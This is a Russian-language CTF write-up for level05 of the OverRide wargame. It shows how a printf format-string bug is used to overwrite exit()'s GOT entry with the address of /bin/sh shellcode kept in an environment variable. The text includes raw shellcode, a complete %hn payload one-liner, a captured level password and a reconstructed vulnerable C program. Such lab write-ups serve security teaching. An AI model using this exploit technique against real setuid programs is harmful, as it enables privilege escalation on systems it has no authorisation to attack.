# LEVEL 05

## Команды и ресурсы
gdb

## Уязвимость
printf format string

## Решение
1. Пробуем запустить.
Пользователь вводит строку,которая затем выводится на экран, при этом заглавные латинские буквы заменяются на маленькие.
Переполнения на первый взгляд не возникает.
Обращаем внимание, что канарейка, NX и другие защиты отсутствуют.

2. Смотрим в отладчике. Детально [тут](resources/disas.md)
Итак, программа считывает ввод пользователя с помощью fgets(buffer, 100, stdin), затем приводит буквы к нижнему регистру, 
после чего выводит на печать строку с помощью незащищенного printf(buffer). После чего вызывается exit()

3. Идея - использовать уязвимость форматной строки и перезаписать адрес exit() на адрес шелл-кода, который мы сохраним в переменной окружения.
4. Определим адрес exit() в GOT Table - 0x80497e0
```asm
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.

```
5. Сгенерируем необходимый шелл-код и сохраним его в переменную окружения:
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```
```bash
export SHELLCODE=`python -c 'print("\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
```

6. Определим адрес переменной окружения с помощью небольшой программы:
```bash
 scp -P 4242 ~/42/override/level05/resources/getenv.c level05@192.168.56.129:/tmp/getenv.c
```

```bash
level05@OverRide:~$ gcc /tmp/getenv.c -m32 -o /tmp/getenv
level05@OverRide:~$ /tmp/getenv
0xffffd886
```
6. Определим позицию нашего буфера в аргументах printf используя спецификатор %x выводящий на печать память
```bash
level05@OverRide:~$ ./level05
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 f7ec3af9 ffffd6cf ffffd6ce 0 ffffffff ffffd754 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825 78252078

```
61616161 - находится на 10 позиции

7. Сгенерируем итоговую строку для взлома используя модификатор %n:

Сложность - адрес нашей переменной окружения - ffffd886 (4294957290) превышает maxint, поэтому нам придется разбить адрес на 2 части
и поменять местами, так как у нас little endian:
- d886 - 55530 (55430 - 8 (количество байт, которые будут находиться в начале буфера в виде двух адресов) = 55422)
- ffff - 65535 (65535 - 55430 = 10105)

[//]: # (- d8ea - 55530 &#40;55530 - 8 &#40;количество байт, которые будут находиться в начале буфера в виде двух адресов&#41; = 55522&#41;)

[//]: # (- ffff - 65535 &#40;65535 - 55530 = 10005&#41;)

количество символов мы запишем по позициям 10 и 11 аргументов printf (используем h для уполовинивания)

наш payload:
```
"2 первых байта адреса exit()" + "2 последних байта адреса exit() + "%55422d" + "%10$hn" + "%10105d" + "%11$hn"
```

```
(python -c 'print("\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%55422d"+"%10$hn"+"%10105d"+"%11$hn")';cat) | ./level05
```


8. Протестируем:
```bash
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

```


## Воссоздадим бинарный файл
```c
#include <stdio.h>

int		main(void)
{
    int	a = 0;
    char	buf[100];

    fgets(buf, 100, stdin);

    while (a < strlen(buf))
    {
        if (buf[a] > 64 && buf[a] <= 90)
            buf[a] ^= 0x20;
        ++a;
    }
    printf(buf);
    exit(0);
}
```


## Переносим на виртуальную машину, компилируем, проверяем
1. Копируем на виртуальную машину
``` bash
 scp -P 4242 ~/42/override/level05/source.c level05@192.168.56.129:/tmp/source_level05.c
 ```

2. заходим под level02 на виртуальную машину
```bash
su level06
```

3. Компилируем

```bash
cd /tmp
gcc -fno-stack-protector -z norelro -z execstack -m32 source_level05.c -o level05
```
```bash
level06@OverRide:/tmp$ checksec --file level05


```

4. Меняем права
```bash
level06@OverRide:/tmp$ chmod u+s level01; chmod +wx level01; chmod +s level01;

```
5. Возвращаемся в юзера level05 и Запускаем
```bash
level06@OverRide:/tmp$ exit


```
6. Проверяем уязвимость
```bash



```